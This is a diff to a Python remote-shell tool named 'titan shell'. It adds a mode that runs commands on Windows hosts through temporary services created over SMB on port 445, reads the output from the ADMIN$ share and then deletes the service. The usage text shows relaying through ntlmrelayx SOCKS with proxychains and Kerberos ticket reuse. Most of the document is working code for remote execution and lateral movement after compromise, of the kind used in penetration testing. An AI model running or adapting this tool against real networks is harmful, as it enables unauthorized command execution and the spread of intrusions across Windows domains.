@@ -14,8 +14,8 @@ Usage:
     KRB5CCNAME=admin.ccache titan shell -k -t HOSTNAME.domain.local
     titan shell -k --ccache admin.ccache -t HOSTNAME.domain.local
 
-  SMB relay / proxychains:
-    proxychains titan shell -u administrator -d DOMAIN --no-pass -t 192.168.1.10
+  SMB relay / proxychains (SCM mode — all traffic on port 445):
+    proxychains titan shell --scm -u administrator -d DOMAIN --no-pass -t 192.168.1.10
 
 Built-in commands (prefix with !):
     !upload <local> [remote]   Upload a local file to the remote host
@@ -23,7 +23,7 @@ Built-in commands (prefix with !):
     !ls [remote_path]          List remote directory (default: cwd)
     !cd <remote_path>          Change remote working directory
     !pwd                       Print remote working directory
-    !ps                        List remote processes
+    !ps                        List remote processes (WMI mode only)
     !services                  List remote services
     !shares                    List SMB shares on remote host
     !help                      Show this help
@@ -36,7 +36,11 @@ import argparse
 import csv
 import io
 import os
+import random
+import string
 import sys
+import tempfile
+import time
 
 try:
     import readline
@@ -55,6 +59,12 @@ BANNER = """\
   type !help for built-in commands, exit to quit
 \033[0m"""
 
+BANNER_SCM = """\
+\033[1;32m
+  titan shell — SCM+SMB interactive shell (port 445 only, relay-compatible)
+  type !help for built-in commands, exit to quit
+\033[0m"""
+
 HELP = """\
 Built-in commands (prefix with !):
   !upload <local> [remote]   Upload local file to remote host via SMB
@@ -62,7 +72,7 @@ Built-in commands (prefix with !):
   !ls [path]                 List remote directory (default: cwd)
   !cd <path>                 Change remote working directory
   !pwd                       Show remote working directory
-  !ps                        List running processes (WMI)
+  !ps                        List running processes (WMI mode only)
   !services                  List services (SCM)
   !shares                    List SMB shares
   !help                      This help
@@ -90,6 +100,81 @@ def _parse_csv(text):
     except Exception:
         return []
 
+
+def _rand(n=8):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+
+
+# ── SCM exec backend ──────────────────────────────────────────────────────────
+
+def _scm_exec(host, auth, command, cwd, timeout=120, verbose=False):
+    """Execute a command via a transient service over named pipes (port 445 only)."""
+    svc_name  = 'ts' + _rand(6)
+    out_fname = _rand(10) + '.txt'
+    out_win   = f'C:\\Windows\\Temp\\{out_fname}'
+    out_unc   = f'\\\\{host}\\ADMIN$\\Temp\\{out_fname}'
+
+    # cmd.exe runs the command, redirects stdout+stderr to a temp file.
+    # Quoting: the outer quotes are for cmd /c; the inner command is raw.
+    bin_path = f'cmd.exe /c "cd /d {cwd} & ({command}) > {out_win} 2>&1"'
+
+    if verbose:
+        print(f'  [scm] svc={svc_name}  out={out_win}', file=sys.stderr)
+
+    # Create + start service (-Start flag, -PreferSmb forces named pipe transport)
+    _, rc = run(SCM, 'create', auth,
+                [host, svc_name, bin_path, '-Start', '-PreferSmb'],
+                verbose=verbose, timeout=30)
+    if rc != 0:
+        return f'[!] Scm create failed (rc={rc})\n', rc
+
+    # Poll until the service reaches Stopped state
+    deadline = time.time() + timeout
+    state    = 'StartPending'
+    while time.time() < deadline:
+        time.sleep(0.5)
+        out, _ = run(SCM, 'query', auth,
+                     [host, '-ConsoleOutputStyle', 'Csv',
+                      '-OutputFields', 'ServiceName,State,Win32ExitCode',
+                      '-PreferSmb'],
+                     verbose=False, timeout=15)
+        for row in _parse_csv(out):
+            if row.get('ServiceName', '').lower() == svc_name.lower():
+                state = row.get('State', state)
+                if verbose:
+                    print(f'  [scm] state={state}', file=sys.stderr)
+                break
+        if state == 'Stopped':
+            break
+    else:
+        # Timed out — try to stop the service before cleanup
+        run(SCM, 'stop', auth, [host, svc_name, '-PreferSmb'],
+            verbose=verbose, timeout=15)
+
+    # Retrieve output file
+    result    = ''
+    local_tmp = tempfile.mktemp(suffix='.txt')
+    out, rc = run(SMB, 'get', auth,
+                  [out_unc, local_tmp, '-Overwrite'],
+                  verbose=verbose, timeout=30)
+    if rc == 0 and os.path.exists(local_tmp):
+        try:
+            with open(local_tmp, 'r', encoding='utf-8', errors='replace') as f:
+                result = f.read()
+        finally:
+            try:
+                os.unlink(local_tmp)
+            except OSError:
+                pass
+
+    # Cleanup: delete the service (already stopped)
+    run(SCM, 'delete', auth, [host, svc_name, '-PreferSmb'],
+        verbose=verbose, timeout=15)
+
+    return result, 0
+
+
+# ── Built-in command handlers ─────────────────────────────────────────────────
 
 def cmd_upload(host, auth, args_str, cwd, verbose=False):
     parts = args_str.split(None, 1)
@@ -175,12 +260,14 @@ def cmd_ps(host, auth, verbose=False):
               f'  {r.get("Name",""):<30}  {(r.get("CommandLine") or "")[:80]}')
 
 
-def cmd_services(host, auth, verbose=False):
+def cmd_services(host, auth, verbose=False, prefer_smb=False):
     if not SCM:
         print('[!] Scm binary not found')
         return
-    out, rc = run(SCM, 'query', auth, [host, '-ConsoleOutputStyle', 'Csv'],
-                  verbose=verbose, timeout=30)
+    extra = [host, '-ConsoleOutputStyle', 'Csv']
+    if prefer_smb:
+        extra.append('-PreferSmb')
+    out, rc = run(SCM, 'query', auth, extra, verbose=verbose, timeout=30)
     if rc != 0:
         print(f'[!] services failed\n{out}')
         return
@@ -234,10 +321,15 @@ def _prompt(cwd, host):
     return f'\033[1;32m[{short}]\033[0m \033[1;33m{cwd}\033[0m> '
 
 
-def shell(host, auth, cwd='C:\\Windows\\System32', verbose=False, timeout=120):
-    print(BANNER)
+# ── Main shell loop ───────────────────────────────────────────────────────────
+
+def shell(host, auth, cwd='C:\\Windows\\System32', verbose=False, timeout=120,
+          use_scm=False):
+    print(BANNER_SCM if use_scm else BANNER)
     user = auth[auth.index('-UserName') + 1] if '-UserName' in auth else '?'
+    mode = 'SCM+SMB (port 445 only)' if use_scm else 'WMI+SMB'
     print(f'[*] Connected to {host} as {user}')
+    print(f'[*] Mode: {mode}')
     print(f'[*] Working directory: {cwd}')
     print(f'[*] Type !help for built-in commands\n')
 
@@ -264,14 +356,24 @@ def shell(host, auth, cwd='C:\\Windows\\System32', verbose=False, timeout=120):
             elif cmd == 'ls':       cmd_ls(host, auth, rest, cwd, verbose=verbose)
             elif cmd == 'cd':       cwd = cmd_cd(cwd, rest)
             elif cmd == 'pwd':      print(cwd)
-            elif cmd == 'ps':       cmd_ps(host, auth, verbose=verbose)
-            elif cmd == 'services': cmd_services(host, auth, verbose=verbose)
+            elif cmd == 'ps':
+                if use_scm:
+                    print('[!] !ps requires WMI (DCOM/port 135) — not available in --scm relay mode')
+                else:
+                    cmd_ps(host, auth, verbose=verbose)
+            elif cmd == 'services':
+                cmd_services(host, auth, verbose=verbose, prefer_smb=use_scm)
             elif cmd == 'shares':   cmd_shares(host, auth, verbose=verbose)
             else: print(f'[!] unknown built-in: !{cmd}  (try !help)')
             continue
 
-        out, rc = run(WMI, 'exec', auth, [host, f'cd /d {cwd} && {line}'],
-                      verbose=verbose, timeout=timeout)
+        if use_scm:
+            out, rc = _scm_exec(host, auth, line, cwd,
+                                 timeout=timeout, verbose=verbose)
+        else:
+            out, rc = run(WMI, 'exec', auth, [host, f'cd /d {cwd} && {line}'],
+                          verbose=verbose, timeout=timeout)
+
         if out:
             sys.stdout.write(out)
             if not out.endswith('\n'):
@@ -279,6 +381,8 @@ def shell(host, auth, cwd='C:\\Windows\\System32', verbose=False, timeout=120):
         elif rc != 0:
             print(f'[!] command failed (rc={rc}) — run with -v for details')
 
+
+# ── Argument parsing + entry point ────────────────────────────────────────────
 
 def parse_args():
     p = argparse.ArgumentParser(
@@ -294,6 +398,9 @@ def parse_args():
                    help='Initial working directory (default: C:\\Windows\\System32)')
     p.add_argument('--timeout', type=int, default=120, metavar='SEC',
                    help='Command execution timeout in seconds (default: 120)')
+    p.add_argument('--scm', action='store_true',
+                   help='Use SCM+SMB exec instead of WMI (port 445 only; '
+                        'works through ntlmrelayx --socks relay)')
     p.add_argument('-v', '--verbose', action='store_true')
 
     args = p.parse_args()
@@ -310,16 +417,22 @@ def main():
     SMB = find_binary('Smb2Client')
     SCM = find_binary('Scm')
 
-    missing = [n for n, b in [('Wmi', WMI), ('Smb2Client', SMB)] if not b]
+    args = parse_args()
+
+    if args.scm:
+        missing = [n for n, b in [('Smb2Client', SMB), ('Scm', SCM)] if not b]
+    else:
+        missing = [n for n, b in [('Wmi', WMI), ('Smb2Client', SMB)] if not b]
+
     if missing:
         print(f'[!] required binaries not found: {", ".join(missing)}', file=sys.stderr)
         sys.exit(1)
-    if not SCM:
+    if not args.scm and not SCM:
         print('[!] Scm binary not found — !services will be unavailable', file=sys.stderr)
 
-    args = parse_args()
     shell(args.target, auth_args(args),
-          cwd=args.cwd, verbose=args.verbose, timeout=args.timeout)
+          cwd=args.cwd, verbose=args.verbose, timeout=args.timeout,
+          use_scm=args.scm)
 
 
 if __name__ == '__main__':
